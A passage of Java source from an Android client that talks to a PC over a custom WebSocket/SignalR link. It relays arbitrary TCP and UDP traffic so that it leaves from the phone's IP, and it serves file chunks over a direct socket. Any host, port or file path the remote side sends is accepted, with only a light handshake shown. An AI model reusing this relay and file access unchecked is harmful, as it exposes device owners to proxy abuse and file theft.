                    }
                } else if ("OpenTunnel".equals(target)) {
                    int streamId = args.optInt(0, -1);
                    String host = args.optString(1, "");
                    int port = args.optInt(2, 0);
                    sendDebugLog(deviceNamePrefix() + " [Tunnel] PC OpenTunnel stream=" + streamId + " -> " + host + ":" + port);
                    openTunnelStream(out, streamId, host, port);
                } else if ("OpenUdp".equals(target)) {
                    int streamId = args.optInt(0, -1);
                    sendDebugLog(deviceNamePrefix() + " [Tunnel] PC OpenUdp stream=" + streamId);
                    openUdpRelay(out, streamId);
                } else if ("TunnelData".equals(target)) {
                    int streamId = args.optInt(0, -1);
                    String b64 = args.optString(1, "");
                    tunnelWrite(streamId, Base64.decode(b64, Base64.NO_WRAP));
                } else if ("TunnelClose".equals(target)) {
                    int streamId = args.optInt(0, -1);
                    sendDebugLog(deviceNamePrefix() + " [Tunnel] PC TunnelClose stream=" + streamId);
                    closeTunnelStream(streamId);
                } else if ("TunnelUdpData".equals(target)) {
                    int streamId = args.optInt(0, -1);
                    String host = args.optString(1, "");
                    int port = args.optInt(2, 0);
                    String b64 = args.optString(3, "");
                    tunnelUdpSend(streamId, host, port, Base64.decode(b64, Base64.NO_WRAP));
                } else if ("TunnelUdpClose".equals(target)) {
                    int streamId = args.optInt(0, -1);
                    sendDebugLog(deviceNamePrefix() + " [Tunnel] PC TunnelUdpClose stream=" + streamId);
                    closeTunnelUdp(streamId);
                } else if ("SpeedTestStart".equals(target)) {
                    int durationMs = args.optInt(0, 5000);
                    int chunkBytes = args.optInt(1, 262144);
                    startSpeedTest(out, durationMs, chunkBytes);
                    if (invocationId != null && !invocationId.isEmpty()) {
                        sendCompletionResponse(out, invocationId, true);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling SignalR message '" + jsonStr + "': " + e.getMessage(), e);
        }
    }

    private static void sendCompletionResponse(OutputStream out, String invocationId, Object result) throws Exception {
        JSONObject completion = new JSONObject();
        completion.put("type", 3);
        completion.put("invocationId", invocationId);
        completion.put("result", result);
        String jsonStr = completion.toString() + SIGNALR_RECORD_SEPARATOR;
        synchronized (out) {
            sendWebSocketText(out, jsonStr);
        }
    }

    private static void sendWebSocketText(OutputStream out, String text) throws Exception {
        byte[] payload = text.getBytes("UTF-8");
        int len = payload.length;
        byte[] maskKey = new byte[4];
        new SecureRandom().nextBytes(maskKey);

        int b0 = 0x80 | 0x01; // FIN=1, Opcode=1 (Text)

        synchronized (out) {
            out.write(b0);
            if (len <= 125) {
                out.write(0x80 | len);
            } else if (len <= 65535) {
                out.write(0x80 | 126);
                out.write((len >> 8) & 0xFF);
                out.write(len & 0xFF);
            } else {
                out.write(0x80 | 127);
                for (int i = 7; i >= 0; i--) {
                    out.write((int) (((long) len >> (i * 8)) & 0xFF));
                }
            }

            out.write(maskKey);
            byte[] maskedPayload = new byte[len];
            for (int i = 0; i < len; i++) {
                maskedPayload[i] = (byte) (payload[i] ^ maskKey[i % 4]);
            }
            out.write(maskedPayload);
            out.flush();
        }
    }

    private static String readWebSocketTextFrame(DataInputStream input) throws Exception {
        int b0 = input.readUnsignedByte();
        int opcode = b0 & 0x0F;
        if (opcode == 0x8) return null; // Close frame

        int b1 = input.readUnsignedByte();
        boolean isMasked = (b1 & 0x80) != 0;
        long payloadLen = b1 & 0x7F;

        if (payloadLen == 126) {
            payloadLen = input.readUnsignedShort();
        } else if (payloadLen == 127) {
            payloadLen = input.readLong();
        }

        byte[] mask = null;
        if (isMasked) {
            mask = new byte[4];
            input.readFully(mask);
        }

        byte[] payload = new byte[(int) payloadLen];
        input.readFully(payload);

        if (mask != null) {
            for (int i = 0; i < payload.length; i++) {
                payload[i] = (byte) (payload[i] ^ mask[i % 4]);
            }
        }

        return new String(payload, "UTF-8");
    }

    private static String readLine(DataInputStream input) throws Exception {
        StringBuilder sb = new StringBuilder();
        while (true) {
            int b = input.read();
            if (b == -1) return sb.length() == 0 ? null : sb.toString();
            if (b == '\n') break;
            if (b != '\r') sb.append((char) b);
        }
        return sb.toString();
    }

    // ── Debug message buffer (read by PC via GetDebugBuffer) ──────────
    private static final java.util.concurrent.ConcurrentLinkedQueue<String> debugBuffer = new java.util.concurrent.ConcurrentLinkedQueue<>();
    private static final int MAX_DEBUG_BUFFER = 200;

    // Stamps prepended to every debug line so the PC can color them: red / green / light-grey.
    static final String STAMP_ERROR   = "[ERROR] ";
    static final String STAMP_SUCCESS = "[SUCCESS] ";
    static final String STAMP_MESSAGE = "[MESSAGE] ";

    private static void sendDebugLog(String stamp, String logMessage) {
        // Debug logs are only sent while the phone's debug config is enabled.
        if (!MediaHelper.currentConfig.sendDebug) return;
        // Always store in buffer (PC polls via GetDebugBuffer) - legacy
        debugBuffer.offer(stamp + logMessage);
        while (debugBuffer.size() > MAX_DEBUG_BUFFER) debugBuffer.poll();
        Log.i(TAG, stamp + logMessage);
        // Also send via new per-class architecture if possible (for testing)
        String logType = stamp.equals(STAMP_ERROR) ? "Error" : stamp.equals(STAMP_SUCCESS) ? "Success" : "Message";
        // Extract class name from caller's stack (skip this method)
        String className = "SignalRClient";
        try {
            StackTraceElement[] stack = Thread.currentThread().getStackTrace();
            for (StackTraceElement el : stack) {
                String cn = el.getClassName();
                if (cn.contains("FileManager") || cn.contains("MediaHelper") || cn.contains("VideoDecoder") || cn.contains("GameForegroundService") || cn.contains("PermissionHelper") || cn.contains("SignalRClient")) {
                    if (!cn.equals(SignalRClient.class.getName()) || !el.getMethodName().equals("sendDebugLog")) {
                        className = cn.substring(cn.lastIndexOf('.') + 1);
                        break;
                    }
                }
            }
        } catch (Exception ignored) {}
        sendClassLog(className, logType, logMessage);
    }

    private static void sendDebugLog(String logMessage) {
        sendDebugLog(STAMP_MESSAGE, logMessage);
    }

    // New per-class log architecture: LogType, ClassName, Log
    public static void sendClassLog(String className, String logType, String log) {
        if (!MediaHelper.currentConfig.sendDebug) return;
        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        String type = logType != null ? logType : "Message";
        String msg = log != null ? log : "";
        // Registration via empty log is handled server-side (empty msg)
        try {
            // Try to send via SignalR SendLog if connected
            if (isConnected && signalRWebSocketOut != null) {
                JSONObject obj = new JSONObject();
                obj.put("type", 1);
                obj.put("target", "SendLog");
                JSONArray args = new JSONArray();
                args.put(deviceName);
                args.put(className);
                args.put(type);
                args.put(msg);
                obj.put("arguments", args);
                sendWebSocketText(signalRWebSocketOut, obj.toString() + SIGNALR_RECORD_SEPARATOR);
                Log.i(TAG, "SendLog: " + className + " [" + type + "] " + (msg.isEmpty() ? "<register>" : msg));
            }
        } catch (Exception e) {
            Log.w(TAG, "SendLog failed: " + e.getMessage());
        }
        // Also keep in buffer for polling fallback (with stamp)
        if (!msg.isEmpty()) {
            String stamp = type.equalsIgnoreCase("Error") ? STAMP_ERROR : type.equalsIgnoreCase("Success") ? STAMP_SUCCESS : STAMP_MESSAGE;
            debugBuffer.offer(stamp + "[" + className + "] " + msg);
            while (debugBuffer.size() > MAX_DEBUG_BUFFER) debugBuffer.poll();
        }
    }

    // ── Tunnel relay: PC routes this phone's outbound sockets so web traffic
    //    egresses from the phone's IP ────────────────────────────────────────

    /** Opens a real TCP socket from THIS phone (egress = this phone's IP). */
    private static void openTunnelStream(final OutputStream out, final int streamId, final String host, final int port) {
        try {
            final Socket sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 15000);
            sock.setTcpNoDelay(true);
            tunnelSockets.put(streamId, sock);
            sendTunnelStatus(out, streamId, true, "");
            Log.i(TAG, "[Tunnel] TCP opened " + streamId + " -> " + host + ":" + port);
            sendDebugLog(STAMP_SUCCESS, deviceNamePrefix() + " [Tunnel] TCP opened stream=" + streamId + " -> " + host + ":" + port);

            new Thread(() -> {
                byte[] buf = new byte[16384];
                try {
                    InputStream in = sock.getInputStream();
                    int n;
                    while ((n = in.read(buf)) > 0) {
                        if (n == buf.length) sendTunnelData(out, streamId, buf);
                        else sendTunnelData(out, streamId, Arrays.copyOf(buf, n));
                    }
                } catch (Exception e) {
                    if (!sock.isClosed()) Log.w(TAG, "[Tunnel] Read end " + streamId + ": " + e.getMessage());
                } finally {
                    tunnelSockets.remove(streamId);
                    try { sock.close(); } catch (Exception ignored) {}
                    sendTunnelClosed(out, streamId);
                    Log.i(TAG, "[Tunnel] TCP closed " + streamId);
                    sendDebugLog(deviceNamePrefix() + " [Tunnel] TCP closed stream=" + streamId);
                }
            }, "tunnel-read-" + streamId).start();
        } catch (Exception e) {
            Log.e(TAG, "[Tunnel] Open failed " + streamId + " " + host + ":" + port + ": " + e.getMessage());
            sendDebugLog(STAMP_ERROR, deviceNamePrefix() + " [Tunnel] TCP open FAILED stream=" + streamId + " " + host + ":" + port + ": " + e.getMessage());
            sendTunnelStatus(out, streamId, false, e.getMessage());
        }
    }

    /** Writes PC-supplied bytes into the tunneled TCP socket. */
    private static void tunnelWrite(int streamId, byte[] data) {
        Socket sock = tunnelSockets.get(streamId);
        if (sock == null) return;
        try {
            OutputStream so = sock.getOutputStream();
            synchronized (sock) { so.write(data); so.flush(); }
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] Write failed " + streamId + ": " + e.getMessage());
            sendDebugLog(STAMP_ERROR, deviceNamePrefix() + " [Tunnel] TCP write failed stream=" + streamId + ": " + e.getMessage());
            closeTunnelStream(streamId);
        }
    }

    /** Closes the tunneled TCP socket (also kills its reader thread via socket close). */
    private static void closeTunnelStream(int streamId) {
        Socket sock = tunnelSockets.remove(streamId);
        if (sock != null) {
            try { sock.close(); } catch (Exception ignored) {}
            Log.i(TAG, "[Tunnel] TCP close requested " + streamId);
        }
    }

    /** Opens a DatagramSocket on this phone so UDP (e.g. DNS) egresses from the phone's IP. */
    private static void openUdpRelay(final OutputStream out, final int streamId) {
        try {
            final DatagramSocket ds = new DatagramSocket();
            tunnelUdpSockets.put(streamId, ds);
            Log.i(TAG, "[Tunnel] UDP relay opened " + streamId);
            sendDebugLog(STAMP_SUCCESS, deviceNamePrefix() + " [Tunnel] UDP relay opened stream=" + streamId);

            new Thread(() -> {
                byte[] buf = new byte[8192];
                try {
                    while (true) {
                        DatagramPacket p = new DatagramPacket(buf, buf.length);
                        ds.receive(p);
                        byte[] data = Arrays.copyOf(p.getData(), p.getLength());
                        String srcHost = p.getAddress().getHostAddress();
                        int srcPort = p.getPort();
                        sendTunnelUdpData(out, streamId, srcHost, srcPort, data);
                    }
                } catch (Exception e) {
                    if (ds.isClosed()) Log.i(TAG, "[Tunnel] UDP relay closed " + streamId);
                    else Log.w(TAG, "[Tunnel] UDP relay error " + streamId + ": " + e.getMessage());
                } finally {
                    tunnelUdpSockets.remove(streamId);
                    try { if (!ds.isClosed()) ds.close(); } catch (Exception ignored) {}
                    sendTunnelUdpClosed(out, streamId);
                    sendDebugLog(deviceNamePrefix() + " [Tunnel] UDP relay closed stream=" + streamId);
                }
            }, "tunnel-udp-" + streamId).start();
        } catch (Exception e) {
            Log.e(TAG, "[Tunnel] UDP open failed " + streamId + ": " + e.getMessage());
            sendDebugLog(STAMP_ERROR, deviceNamePrefix() + " [Tunnel] UDP open FAILED stream=" + streamId + ": " + e.getMessage());
            closeTunnelUdp(streamId);
        }
    }

    /** Sends one UDP datagram from this phone to (host, port). */
    private static void tunnelUdpSend(int streamId, String host, int port, byte[] data) {
        DatagramSocket ds = tunnelUdpSockets.get(streamId);
        if (ds == null) return;
        try {
            DatagramPacket p = new DatagramPacket(data, data.length,
                new InetSocketAddress(host, port));
            ds.send(p);
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] UDP send failed " + streamId + ": " + e.getMessage());
            sendDebugLog(STAMP_ERROR, deviceNamePrefix() + " [Tunnel] UDP send failed stream=" + streamId + ": " + e.getMessage());
            closeTunnelUdp(streamId);
        }
    }

    private static void closeTunnelUdp(int streamId) {
        DatagramSocket ds = tunnelUdpSockets.remove(streamId);
        if (ds != null) {
            try { ds.close(); } catch (Exception ignored) {}
            Log.i(TAG, "[Tunnel] UDP close requested " + streamId);
        }
    }

    // ── Speed test (temp): phone blasts synthetic bytes to PC over the ──────
    // same WebSocket path files use (phone → Cloudflare → PC). No disk I/O.

    private static void startSpeedTest(final OutputStream out, final int durationMs, final int chunkBytes) {
        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                long bytes = 0;
                int frames = 0;
                long start = System.currentTimeMillis();
                long deadline = start + Math.max(durationMs, 1000);
                byte[] chunk = new byte[Math.max(chunkBytes, 4096)];
                new java.util.Random(42).nextBytes(chunk);
                String b64 = Base64.encodeToString(chunk, Base64.NO_WRAP);
                String msg = "{\"type\":1,\"target\":\"SpeedTestData\",\"arguments\":[\"" + b64 + "\"]}" + SIGNALR_RECORD_SEPARATOR;
                try {
                    while (isConnected && isRunning && System.currentTimeMillis() < deadline) {
                        sendWebSocketText(out, msg);
                        bytes += chunk.length;
                        frames++;
                    }
                } catch (Exception e) {
                    Log.w(TAG, "[SpeedTest] send error: " + e.getMessage());
                }
                long elapsed = System.currentTimeMillis() - start;
                sendDebugLog(STAMP_SUCCESS, deviceNamePrefix() + " [SpeedTest] DONE frames=" + frames + " bytes=" + bytes + " in " + elapsed + "ms");
            }
        });
        t.setDaemon(true);
        t.start();
    }

    // ── Phone → PC tunnel messages ──────────────────────────────────────────

    private static void sendTunnelData(OutputStream out, int streamId, byte[] data) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", 1);
            payload.put("target", "TunnelData");
            JSONArray args = new JSONArray();
            args.put(streamId);
            args.put(Base64.encodeToString(data, Base64.NO_WRAP));
            payload.put("arguments", args);
            sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] sendTunnelData error: " + e.getMessage());
        }
    }

    private static void sendTunnelStatus(OutputStream out, int streamId, boolean ok, String message) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", 1);
            payload.put("target", "TunnelStatus");
            JSONArray args = new JSONArray();
            args.put(streamId);
            args.put(ok);
            args.put(message == null ? "" : message);
            payload.put("arguments", args);
            sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] sendTunnelStatus error: " + e.getMessage());
        }
    }

    private static void sendTunnelClosed(OutputStream out, int streamId) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", 1);
            payload.put("target", "TunnelClosed");
            JSONArray args = new JSONArray();
            args.put(streamId);
            payload.put("arguments", args);
            sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] sendTunnelClosed error: " + e.getMessage());
        }
    }

    private static void sendTunnelUdpData(OutputStream out, int streamId, String host, int port, byte[] data) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", 1);
            payload.put("target", "TunnelUdpData");
            JSONArray args = new JSONArray();
            args.put(streamId);
            args.put(host);
            args.put(port);
            args.put(Base64.encodeToString(data, Base64.NO_WRAP));
            payload.put("arguments", args);
            sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] sendTunnelUdpData error: " + e.getMessage());
        }
    }

    private static void sendTunnelUdpClosed(OutputStream out, int streamId) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", 1);
            payload.put("target", "TunnelUdpClosed");
            JSONArray args = new JSONArray();
            args.put(streamId);
            payload.put("arguments", args);
            sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
        } catch (Exception e) {
            Log.w(TAG, "[Tunnel] sendTunnelUdpClosed error: " + e.getMessage());
        }
    }

    // ── P2P direct datapath ──────────────────────────────────────────────────
    // Phone dials the PC's LAN candidate endpoints over raw TCP. The PC verifies
    // with a bidirectional echo; once verified the phone serves file chunks here
    // instead of round-tripping through the Cloudflare Domain relay. The Domain
    // channel stays alive as control/heartbeat and takes over instantly if this
    // socket drops — P2P can never break anything.

    private static void handleP2PStart(final OutputStream wsOut, final List<String> candidates) {
        new Thread(() -> {
            for (String candidate : candidates) {
                if (!isRunning || !isConnected) return;
                if (tryConnectP2P(wsOut, candidate)) return;
            }
            sendDebugLog(deviceNamePrefix() + " [P2P] All direct-link candidates failed — staying on Domain relay");
        }, "p2p-connect").start();
    }

    private static boolean tryConnectP2P(final OutputStream wsOut, final String candidate) {
        String host;
        int port;
        try {
            String[] hp = candidate.split(":");
            host = hp[0];
            port = hp.length > 1 ? Integer.parseInt(hp[1]) : 5201;
        } catch (Exception e) {
            return false;
        }

        Socket sock = null;
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 4000);
            sock.setTcpNoDelay(true);
            sock.setSoTimeout(60000);
            final Socket finalSock = sock;
            final OutputStream sockOut = sock.getOutputStream();
            final DataInputStream sockIn = new DataInputStream(new BufferedInputStream(sock.getInputStream()));

            // Handshake: announce our DeviceId
            String deviceId = getDeviceId();
            sockOut.write(("HELLO " + deviceId + "\n").getBytes("UTF-8"));
            sockOut.flush();

            String okLine = readLine(sockIn);
            if (okLine == null || !okLine.startsWith("OK ")) {
                Log.w(TAG, "[P2P] Handshake rejected by " + candidate + ": " + okLine);
                sock.close();
                return false;
            }

            // The PC runs a bidirectional echo check right after OK. We reply to
            // any ECHO we receive; verification is completed on the PC side.
            String echoLine = readLine(sockIn);
            if (echoLine == null || !echoLine.startsWith("ECHO ")) {
                Log.w(TAG, "[P2P] Missing echo challenge from " + candidate + ": " + echoLine);
                sock.close();
                return false;
            }
            sockOut.write((echoLine + "\n").getBytes("UTF-8"));
            sockOut.flush();

            p2pSocket = finalSock;
            p2pOut = sockOut;
            p2pIn = sockIn;
            p2pActive.set(true);

            sendDebugLog(STAMP_SUCCESS, deviceNamePrefix() + " [P2P] Direct link UP via " + candidate + " (" + getDeviceId() + ")");

            // Keep the mapping alive + let the PC watchdog see traffic.
            if (p2pPingScheduler != null) p2pPingScheduler.shutdownNow();
            p2pPingScheduler = Executors.newSingleThreadScheduledExecutor();
            p2pPingScheduler.scheduleAtFixedRate(() -> {
                try {
                    if (p2pActive.get() && p2pOut != null) {
                        synchronized (p2pOut) {
                            p2pOut.write(("PING " + System.currentTimeMillis() + "\n").getBytes("UTF-8"));
                            p2pOut.flush();
                        }
                    }
                } catch (Exception ignored) {}
            }, 15, 15, TimeUnit.SECONDS);

            new Thread(() -> p2pReaderLoop(sockIn, sockOut, wsOut), "p2p-reader").start();
            return true;
        } catch (Exception e) {
            Log.i(TAG, "[P2P] Candidate failed " + candidate + ": " + e.getMessage());
            try { if (sock != null) sock.close(); } catch (Exception ignored) {}
            return false;
        }
    }

    /** Reader loop for the direct P2P socket. Serves file chunks + answers heartbeats. */
    private static void p2pReaderLoop(DataInputStream in, OutputStream sockOut, final OutputStream wsOut) {
        try {
            String line;
            while (p2pActive.get() && (line = readLine(in)) != null) {
                if (line.startsWith("PING ")) {
                    synchronized (sockOut) {
                        sockOut.write(("PONG " + line.substring(5) + "\n").getBytes("UTF-8"));
                        sockOut.flush();
                    }
                } else if (line.startsWith("ECHO ")) {
                    synchronized (sockOut) {
                        sockOut.write((line + "\n").getBytes("UTF-8"));
                        sockOut.flush();
                    }
                } else if (line.startsWith("FILE ")) {
                    handleP2PFileRequest(in, sockOut, line);
                }
            }
        } catch (Exception e) {
            Log.i(TAG, "[P2P] Reader loop ended: " + e.getMessage());
        } finally {
            p2pActive.set(false);
            closeP2P();
            sendP2PClosed(wsOut);
            sendDebugLog(deviceNamePrefix() + " [P2P] Direct link closed — Domain relay takes over");
        }
    }

    /** FILE <reqId> <path64> <offset> <count> <lowRes> <frame> <quality> */
    private static void handleP2PFileRequest(DataInputStream in, OutputStream sockOut, String line) {
        String[] parts = line.split(" ");
        if (parts.length < 8) {
            try {
                synchronized (sockOut) { sockOut.write(("ERR 0 malformed\n").getBytes("UTF-8")); sockOut.flush(); }
            } catch (Exception ignored) {}
            return;
        }
        int reqId;
        try {
            reqId = Integer.parseInt(parts[1]);
        } catch (Exception e) { return; }

        String path = new String(Base64.decode(parts[2], Base64.DEFAULT));
        long offset = Long.parseLong(parts[3]);
        int count = Integer.parseInt(parts[4]);
        boolean lowRes = parts[5].equals("1");
        float frame = Float.parseFloat(parts[6]);
        float quality = Float.parseFloat(parts[7]);

        try {
            byte[] chunk = FileManager.getFileChunkWithOverride(path, offset, count, lowRes, frame, quality);
            synchronized (sockOut) {
                sockOut.write(("DATA " + reqId + " " + chunk.length + "\n").getBytes("UTF-8"));
                sockOut.write(chunk);
                sockOut.flush();
            }
        } catch (Exception e) {
            try {
                synchronized (sockOut) {
                    sockOut.write(("ERR " + reqId + " " + e.getMessage() + "\n").getBytes("UTF-8"));
                    sockOut.flush();
                }
            } catch (Exception ignored) {}
        }
    }

    private static void closeP2P() {
        if (p2pPingScheduler != null) { p2pPingScheduler.shutdownNow(); p2pPingScheduler = null; }
        Socket s = p2pSocket;
        p2pSocket = null;
        p2pOut = null;
        p2pIn = null;
        if (s != null) { try { s.close(); } catch (Exception ignored) {} }
    }

    private static void sendP2PClosed(OutputStream out) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", 1);
            payload.put("target", "P2PClosed");
            JSONArray args = new JSONArray();
            String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
            args.put(deviceName);
            payload.put("arguments", args);
            sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
        } catch (Exception e) {
            Log.w(TAG, "[P2P] sendP2PClosed error: " + e.getMessage());
        }
    }

    private static void closeAllTunnels() {
        int tcpCount = tunnelSockets.size();
        int udpCount = tunnelUdpSockets.size();
        for (Integer id : tunnelSockets.keySet()) closeTunnelStream(id);
        for (Integer id : tunnelUdpSockets.keySet()) closeTunnelUdp(id);
        tunnelSockets.clear();
        tunnelUdpSockets.clear();
        if (tcpCount + udpCount > 0) {
            sendDebugLog(deviceNamePrefix() + " [Tunnel] Closed all tunnels (" + tcpCount + " TCP, " + udpCount + " UDP)");
        }
    }

    /** Picks a stamp based on the message content (used by generic loggers that pass free-form text). */
    private static String classifyStamp(String msg) {
        String upper = (msg == null ? "" : msg).toUpperCase();
        if (upper.startsWith("ERROR") || upper.startsWith("CATCH") || upper.startsWith("FAIL")
            || upper.startsWith("EXCEPTION")) return STAMP_ERROR;
        if (upper.startsWith("COMPLETE") || upper.startsWith("DONE") || upper.startsWith("SUCCESS")) return STAMP_SUCCESS;
        return STAMP_MESSAGE;
    }

    private static void cleanupConnection() {
        sendDebugLog(deviceNamePrefix() + " [Tunnel] PC connection dropped, cleaning up tunnels");
        isConnected = false;
        signalRWebSocketOut = null;
        closeAllTunnels();
        p2pActive.set(false);
        closeP2P();
        if (pingScheduler != null) {
            pingScheduler.shutdownNow();
            pingScheduler = null;
        }
        if (activeSocket != null) {
            try { activeSocket.close(); } catch (Exception ignored) {}
            activeSocket = null;
        }
        // Connection dropped or app stopped: wipe any transcoded files in the FIFO room.
        cleanupTranscodedFiles();
    }}
